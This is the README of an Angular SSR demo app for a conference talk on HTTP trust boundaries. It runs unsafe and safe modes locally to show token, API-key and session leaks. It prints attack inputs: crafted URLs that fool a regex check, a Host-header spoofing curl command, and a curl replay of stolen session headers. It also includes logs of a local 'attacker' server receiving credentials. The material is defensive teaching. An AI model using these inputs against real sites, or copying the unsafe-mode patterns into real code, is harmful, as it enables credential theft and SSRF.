# corner-shop

Es la demo de mi charla **"Más allá de los interceptores: las fronteras de confianza de Angular HTTP"**, en el DevFest Callao 2026. Soy Jaime Burgos Tejada ([@SkyZeroZx](https://github.com/SkyZeroZx)).

corner-shop es una bodega online como cualquier otra. Tiene Angular 22.2 con SSR, hydration y Service Worker, una API en NestJS y un servidor `attacker` que solo anota lo que le llega. La misma app corre en dos modos:

- `unsafe`: la app como la entregó el equipo, con decisiones que se ven en cualquier proyecto.
- `safe`: las mismas pantallas y features, pero con otras decisiones en cada frontera.

Todo corre en tu máquina, en loopback, y los secretos son datos de prueba.

## Requisitos

- Node.js 22.12 o superior (lo probé con 24.16)
- Chrome o Edge, solo para `npm run verify`

## Cómo correrlo

```bash
npm install
npm run build
npm start            # modo unsafe
npm run start:safe   # modo safe
```

| Servidor           | URL                           |
| ------------------ | ----------------------------- |
| shop (Angular SSR) | http://localhost:4000         |
| api (NestJS)       | http://localhost:3000/api     |
| attacker (NestJS)  | http://localhost:9999/\_\_log |

`npm run verify` corre los labs 1 a 5 en los dos modos y te muestra qué se filtró:

```bash
npm run verify
```

```text
 Lab                                       unsafe    safe
 --------------------------------------------------------------
 1  Token on a URL that "looks relative"   LEAKED    blocked
 2  Host header steers SSR requests        LEAKED    blocked
 3  Custom header follows a redirect       LEAKED    blocked
 4  Private data in shared HTML            LEAKED    blocked
 5  Service Worker cache across users      LEAKED    blocked
```

## La charla y los labs

La charla sigue un `http.get('/api/me')` por seis fronteras. En cada una hay un caso real de Angular y un lab que lo muestra en esta app. La app usa Angular 22.2.3 con todos los parches.

| Frontera                                  | Lab | Cómo verlo                    | Advisory                                                                                                                                                                                                                                                                                        |
| ----------------------------------------- | --- | ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1 · La URL: otro parser                   | 1   | `/promos`, `npm run lab:urls` | [GHSA-jfgx-762w-99vr](https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr)                                                                                                                                                                                               |
| 2 · El SSR: otro proceso                  | 2   | `npm run lab:host`            | [GHSA-w739-gvwx-grc3](https://github.com/angular/angular/security/advisories/GHSA-w739-gvwx-grc3), con [su PoC](https://github.com/SkyZeroZx/angular-ssr-router-open-redirect); [CVE-2026-27739](https://github.com/angular/angular-cli/security/advisories/GHSA-x288-3778-4hhx) para el `Host` |
| 3 · Los redirects: otro destino           | 3   | `npm run lab:redirect`        | [CVE-2026-54264](https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p)                                                                                                                                                                                                    |
| 4 · XHR y fetch: otro cliente             | XHR | `npm run lab:xhr`             | `ServerXhr` deprecated desde 22.0.1, [#70540](https://github.com/angular/angular/issues/70540) (sin CVE)                                                                                                                                                                                        |
| 5 · El HTML: otro lector                  | 4   | `/`, `npm run lab:cache`      | [CVE-2026-88059](https://github.com/angular/angular/security/advisories/GHSA-p297-fm68-3q8c), [CVE-2026-54267](https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg)                                                                                                      |
| 6 · El Service Worker: otro intermediario | 5   | `/orders`, en el navegador    | [CVE-2026-50184](https://github.com/angular/angular/security/advisories/GHSA-95qp-cmmw-mgqv)                                                                                                                                                                                                    |

El open redirect del SSR (GHSA-w739) está corregido desde la 22.2.1, así que en la charla lo muestro con su PoC. El Lab 2 muestra otro problema de la misma frontera, porque en SSR tu servidor también hace requests.

Los `npm run lab:*` imprimen lo mismo que `curl` sin que tengas que escribirlo. Todos menos `lab:urls` necesitan el stack corriendo (`npm start` o `npm run start:safe`).

### Lab 1 · Fuga del token Bearer por dos parsers

Una promo del CMS trae `trackUrl: '/\localhost:9999/collect'`. El interceptor de auth revisa con un regex si la URL es "nuestra", ve que sí y le pone el token. Pero el navegador la lee con el parser WHATWG y la manda a otro origen.

Puedes verlo sin navegador:

```bash
npm run lab:urls
```

```text
case                        input                               regex says   fetch() sends to        token
backslash                   '/\localhost:9999/collect'          relative     http://localhost:9999   LEAKS
leading tab                 '\t//localhost:9999/collect'        relative     http://localhost:9999   LEAKS
inner line feed             '/\n/localhost:9999/collect'        relative     http://localhost:9999   LEAKS
...
14 of 17 inputs: the regex says "ours", the browser sends them somewhere else.
```

En el navegador, entra como Ana en `/login`, ve a `/promos` y dale **Save promo** en "Alfajores -20%". En la terminal sale esto:

```text
[attacker] preflight /collect?promo=alfajores  asks for: authorization, content-type  → yes
[attacker] POST /collect?promo=alfajores  authorization=Bearer at_ana_…
```

El `X-XSRF-TOKEN` no aparece porque el interceptor XSRF de Angular 22 ya compara orígenes con `new URL()`. El interceptor de la app todavía usa el regex. Con el toggle de la página puedes cambiar el chequeo en vivo.

CORS no lo frena porque el preflight lo contesta el destino, y aquí el destino es el atacante ([attacker/src/main.ts](apps/attacker/src/main.ts)).

### Lab 2 · SSRF por el header `Host`

En SSR, Angular completa las URLs relativas con el `Host` del request que llegó. En modo `unsafe` alguien puso `NG_ALLOWED_HOSTS=*` para que dejaran de salir unos `400` detrás del balanceador. Desde entonces nadie valida el header `Host`, y el atacante decide a dónde van esas URLs.

```bash
npm run lab:host
# equivale a: curl -H "Host: 127.0.0.1:9999" http://localhost:4000/deals
```

```text
HTTP 200
The page your server rendered shows the attacker's deal.
[attacker] GET /api/deals/today  x-internal-key=sk_internal_corner_shop_demo
```

En `safe`, con `allowedHosts` el servidor responde `400` antes de renderizar y al atacante no le llega nada.

### Lab 3 · Fuga de headers secretos en un redirect

Para el último Cyber Wow, las ofertas del día se publicaron como un JSON en el sitio de la campaña (`cyber.cornershop.pe`) y `/api/deals/today` empezó a responder `302` hacia ese archivo. La campaña terminó y borraron el bucket, pero el CNAME y el redirect se quedaron. Alguien creó un bucket con el mismo nombre, así que ese subdominio ahora es suyo. En la demo, ese alguien es el atacante en `:9999` ([config.ts](apps/api/src/app/config.ts)).

La página no tiene nada raro. Usa `httpResource` y la hydration de siempre ([deals.ts](apps/shop/src/app/pages/deals/deals.ts)). En SSR, el interceptor le pone la API key interna (`X-Internal-Key`) y la sesión del usuario (`X-Session`) a cada llamada a la API. Cuando llega el `302`, `fetch` sigue el redirect y tu interceptor ni se entera.

```bash
npm run lab:redirect
# equivale a: curl -b "sid=$ANA" http://localhost:4000/deals
```

```text
The page shows whatever the campaign site serves now.
[attacker] GET /deals/today.json  x-session=sid_ana_…  x-internal-key=sk_internal_corner_shop_demo
```

En la terminal del stack se ve el camino completo:

```text
[ssr] fetch sent       GET http://localhost:4000/api/deals/today  carrying x-session, x-internal-key
[attacker] GET /deals/today.json  x-session=sid_ana_…  x-internal-key=sk_internal_corner_shop_demo
[ssr]   ↪ followed a redirect to http://localhost:9999/deals/today.json
```

En un redirect a otro origen, el estándar Fetch borra `Authorization` y Node además borra `Cookie`. Los headers custom, como estos dos, pasan tal cual. Con ellos el atacante llama a la API como si fuera Ana:

```bash
curl -H "X-Internal-Key: sk_internal_corner_shop_demo" -H "X-Session: sid_ana_…" http://localhost:3000/api/me
```

En `safe`, las llamadas a tu API llevan `redirect: 'error'` en el servidor y en el navegador, y la página muestra "Deals unavailable". El subdominio sigue siendo del atacante, y eso ya no se arregla en Angular. Hay que borrar el CNAME y el redirect.

### Lab XHR · Fuga del `Authorization` con `xhr2`

Si usas `provideHttpClient(withXhr())`, en SSR los requests salen por `xhr2`, a través de `ServerXhr` de `@angular/platform-server`. `ServerXhr` está deprecated desde 22.0.1, 21.2.17 y 20.3.25, y se elimina en Angular 23. El problema es que `xhr2` reenvía `Authorization` en redirects a otro origen y sigue los redirect loops sin cortarlos. Desde Angular 22, el backend por defecto es `fetch`.

```bash
npm run lab:xhr
```

```text
$ fetch GET http://localhost:3000/api/deals/today
[attacker] GET /deals/today.json  (nothing interesting)

$ xhr2  GET http://localhost:3000/api/deals/today
[attacker] GET /deals/today.json  authorization=Bearer at_ana_…

new URL() resolves it to http://localhost:4000/%C2%A0http://localhost:9999/collect?lab=xhr  same origin
$ xhr2  GET " http://localhost:9999/collect?lab=xhr"
[attacker] GET /collect?lab=xhr  authorization=Bearer at_ana_…
```

Los dos primeros casos usan el mismo Bearer y el mismo `302` a otro origen. Con `fetch` el `Authorization` se borra, y con `xhr2` le llega al atacante.

La segunda parte es [angular/angular#70540](https://github.com/angular/angular/issues/70540), que no tiene CVE. Angular usaba `String.prototype.trim()` para decidir si la URL era absoluta. `trim()` también borra espacios Unicode como `U+00A0`, pero a `xhr2` le llegaba el string original. Para `new URL()` esa URL es una ruta de tu origen, así que tu interceptor le pone el token. `xhr2` la lee con el parser legacy de Node y la manda a otro host.

Está corregido en 22.1.8 y 22.2.0 ([#70542](https://github.com/angular/angular/pull/70542)), y el PoC está en [angular-serverxhr-poc](https://github.com/SkyZeroZx/angular-serverxhr-poc). Este lab llama a `xhr2` directo para mostrar el parser, porque la app de la demo usa `fetch`.

Si tu app tiene SSR, no uses `withXhr()`.

### Lab 4 · Datos privados en un cache compartido

La home saluda con "Hi, Ana" usando los datos de `/api/me`. En SSR, el interceptor reenvía la sesión como `X-Session`, y `HttpTransferCache` no reconoce ese header como credencial. Por eso la respuesta termina dentro de `<script id="ng-state">`. Después ese HTML se guarda en un cache compartido que no mira cookies.

```bash
npm run lab:cache
```

```text
$ curl -b "sid=$ANA" http://localhost:4000/
x-cache: MISS   cache-control: public, max-age=60

$ curl http://localhost:4000/
x-cache: HIT   Hi, Ana Quispe (and her balance, in the HTML and in ng-state)
```

En `safe`:

- la API responde `/api/me` con `Cache-Control: private, no-store`, y Angular 22 ya no guarda esas respuestas en el transfer cache;
- el request lleva `transferCache: false`;
- el HTML que se renderizó con la sesión sale como `private, no-store`.

Con eso, el primer `curl` da `x-cache: BYPASS` y el segundo imprime `no trace of Ana`.

### Lab 5 · Cache del Service Worker compartido entre usuarios

En [ngsw-config.json](apps/shop/ngsw-config.json), `/api/orders` está en un `dataGroup` con estrategia `performance`. El Service Worker guarda las respuestas por URL y no sabe qué usuario las pidió.

1. Corre `npm start`, abre http://localhost:4000/login y recarga una vez para que el Service Worker controle la página.
2. Entra como Ana y abre **Orders**.
3. Cierra sesión, entra como Beto y abre **Orders**. Vas a ver "Orders for Ana Quispe".

En `safe`, los requests privados llevan `ngsw-bypass` y el sign-out borra los caches `ngsw:*:data:*`. El fix de verdad es sacar `/api/orders` del `dataGroup`. Como eso cambia el build, la demo usa el header para que los dos modos corran con el mismo build.

## Qué cambia en modo `safe`

| Decisión                                                                       | Dónde                                                                                                                                            |
| ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Comparar orígenes con `new URL()`, no con un regex                             | [auth-interceptor.ts](apps/shop/src/app/http/auth-interceptor.ts), [first-party.ts](apps/shop/src/app/http/first-party.ts)                       |
| Sacar la URL de la API de la config, no del request                            | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts)                                                                    |
| La API key interna y la sesión solo van a las APIs privadas                    | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts)                                                                    |
| `redirect: 'error'` en las llamadas a tu API, en el servidor y en el navegador | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts), [auth-interceptor.ts](apps/shop/src/app/http/auth-interceptor.ts) |
| `transferCache: false` y HTML `private, no-store` si el render usó la sesión   | [server-api-interceptor.ts](apps/shop/src/app/http/server-api-interceptor.ts)                                                                    |
| `Cache-Control: private, no-store` en las respuestas de cada usuario           | [account.controller.ts](apps/api/src/app/account.controller.ts)                                                                                  |
| `allowedHosts` explícito, sin `*`                                              | [project.json](apps/shop/project.json), [servers.mjs](tools/servers.mjs)                                                                         |
| `ngsw-bypass` en las APIs privadas y limpiar los caches en el sign-out         | [auth-interceptor.ts](apps/shop/src/app/http/auth-interceptor.ts), [session-store.ts](apps/shop/src/app/core/session-store.ts)                   |

El servidor lee el modo de `SAFE=1` y se lo pasa al navegador por `TransferState` ([lab-mode.ts](apps/shop/src/app/lab/lab-mode.ts)). Eso es solo para la demo, no lo copies en tu app.

Hay cosas que no cambian entre modos porque no son parte de ningún lab. La API valida el usuario en el login, chequea XSRF con double submit ([guards.ts](apps/api/src/app/guards.ts)), acepta `X-Session` solo si viene con la API key interna ([sessions.service.ts](apps/api/src/app/sessions.service.ts)) y cierra la sesión en el servidor cuando haces sign-out.

## Estructura

```text
apps/
  shop/        Angular 22.2: SSR, hydration, HttpTransferCache, Service Worker
    src/server.ts      Express 5: proxy /api, edge cache, log de los fetch que salen
    src/server/        proxy, edge cache (X-Cache) y logs del SSR
    src/app/http/      los interceptores de la charla
    src/app/pages/     home, promos, deals, orders, login
  api/         NestJS: sesión, perfil, pedidos, promos, deals (302 al sitio de la campaña)
  attacker/    NestJS: CORS abierto y un log de lo que le llega
tools/
  stack.mjs    levanta los tres servidores
  servers.mjs  puertos y variables de entorno de cada servidor
  client.mjs   los requests que labs.mjs y verify.mjs mandan al stack
  labs.mjs     Labs 2, 3, 4 y XHR sin escribir curl
  url-lab.mjs  Lab 1 sin navegador
  verify.mjs   los labs 1 a 5, en los dos modos, con Chrome headless
```

## Advisories

### Los míos en esta charla

| Frontera          | Advisory                                                                                                                                                                                        | Mi rol                   |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| La URL            | [GHSA-jfgx-762w-99vr](https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr): fuga del token XSRF por parser discrepancy, porque el fix de CVE-2025-66035 quedó incompleto | lo encontré              |
| El SSR            | [GHSA-w739-gvwx-grc3](https://github.com/angular/angular/security/advisories/GHSA-w739-gvwx-grc3): open redirect con URLs protocol-relative en SSR                                              | lo encontré              |
| Los redirects     | [CVE-2026-54264](https://github.com/angular/angular/security/advisories/GHSA-qxh6-94w6-9r5p): el Service Worker reenviaba headers sensibles en redirects a otro origen                          | lo arreglé               |
| XHR y fetch       | [#70540](https://github.com/angular/angular/issues/70540): `ServerXhr` mandaba a otro origen una URL que `new URL()` tomaba como propia (sin CVE)                                               | lo encontré y lo arreglé |
| El HTML           | [CVE-2026-88059](https://github.com/angular/angular/security/advisories/GHSA-p297-fm68-3q8c): bypass de `HttpTransferCache` con `withRequestsMadeViaParent`                                     | lo arreglé               |
| El HTML           | [CVE-2026-54267](https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg): DOM clobbering de `ng-state` en la hydration                                                      | lo reporté               |
| El HTML           | [CVE-2026-50556](https://github.com/angular/angular/security/advisories/GHSA-gxx4-3xcv-f8qx): XSS en SSR por no escapar `<noscript>`                                                            | lo arreglé               |
| El HTML           | [CVE-2026-50555](https://github.com/angular/angular/security/advisories/GHSA-hqr9-c56f-3x7f): XSS en SSR porque un emoji antes de `</iframe>` corría los índices del escape de Domino           | lo analicé               |
| El HTML           | [CVE-2026-69149](https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v): XSS en SSR por contenido raw de fallback sin escapar                                              | lo arreglé               |
| El Service Worker | [CVE-2026-50184](https://github.com/angular/angular/security/advisories/GHSA-95qp-cmmw-mgqv): el Service Worker perdía `credentials` y el modo de cache al rearmar los requests                 | lo arreglé               |

Los PoC están en mi GitHub: [angular-xsrf-origin-bypass-poc](https://github.com/SkyZeroZx/angular-xsrf-origin-bypass-poc), [angular-ssr-router-open-redirect](https://github.com/SkyZeroZx/angular-ssr-router-open-redirect) y [angular-serverxhr-poc](https://github.com/SkyZeroZx/angular-serverxhr-poc).

### Otros en las mismas fronteras

| Frontera      | Advisories                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| La URL        | [CVE-2025-66035](https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| El SSR        | [CVE-2025-62427](https://github.com/angular/angular-cli/security/advisories/GHSA-q63q-pgmf-mxhr), [CVE-2026-27739](https://github.com/angular/angular-cli/security/advisories/GHSA-x288-3778-4hhx), [CVE-2026-33397](https://github.com/angular/angular-cli/security/advisories/GHSA-vfx2-hv2g-xj5f), [CVE-2026-41423](https://github.com/angular/angular/security/advisories/GHSA-45q2-gjvg-7973), [CVE-2026-46417](https://github.com/angular/angular/security/advisories/GHSA-rfh7-fxqc-q52v), [CVE-2026-50168](https://github.com/angular/angular/security/advisories/GHSA-xrxm-cp7j-8xf6), [CVE-2026-88056](https://github.com/angular/angular/security/advisories/GHSA-f6mr-pjwc-34m4) |
| Los redirects | [CVE-2026-27738](https://github.com/angular/angular-cli/security/advisories/GHSA-xh43-g2fq-wjrj), [CVE-2026-50169](https://github.com/angular/angular/security/advisories/GHSA-gv2q-mqqv-365m)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| El HTML       | [CVE-2026-50170](https://github.com/angular/angular/security/advisories/GHSA-q6f4-qqrg-jv6x), [CVE-2026-54266](https://github.com/angular/angular/security/advisories/GHSA-39pv-4j6c-2g6v), [CVE-2026-68945](https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j)                                                                                                                                                                                                                                                                                                                                                                                                     |

La app usa Angular 22.2.3 y tiene todos esos fixes. Lo que se filtra en los labs sale de decisiones de la app en esas mismas fronteras.

## Antivirus que inyectan scripts

Kaspersky inyecta un script en cada página, agrega `X-KL-saas-Ajax-Request` a los `fetch()` y contesta los preflights CORS por su cuenta. Otros antivirus hacen algo parecido. Con eso el Lab 1 falla en el navegador con `Request header field authorization is not allowed`. Antes de correr los labs, excluye `localhost` del análisis de tráfico web. `npm run verify` ya bloquea ese script.

## Versiones

Angular 22.2.3 · Nx 23.3.0 · NestJS 11.2.7 · Express 5.3 · TypeScript 6.0 · Node 24.

NestJS 12 ya salió, pero `@nx/nest` 23.3 solo soporta `<12`. Por eso lo dejé en 11, así `npm install` funciona sin flags.

## Licencia

[MIT](LICENSE)
